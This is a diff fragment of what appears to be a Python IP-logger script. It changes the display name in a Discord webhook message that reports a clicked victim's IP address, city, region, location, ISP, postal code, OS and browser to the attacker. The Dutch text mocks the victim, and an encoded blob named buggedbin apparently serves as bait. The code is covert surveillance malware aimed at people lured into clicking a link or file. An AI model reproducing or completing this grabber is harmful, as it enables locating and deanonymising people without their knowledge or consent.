@@ -10,7 +10,7 @@ buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-  "username": "BigDickRandy",
+  "username": "Captain Hook",
   "content": "@everyone",
   "embeds": [
     {
@@ -18,7 +18,7 @@ def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
       "color": 16711803,
       "description": "Een Kleine Lozer Heeft Er Op Geklikt Info Staat Hier Beneden.",
       "author": {
-        "name": "BigDickRandy"
+        "name": "Captain Hook"
       },
       "fields": [
         {
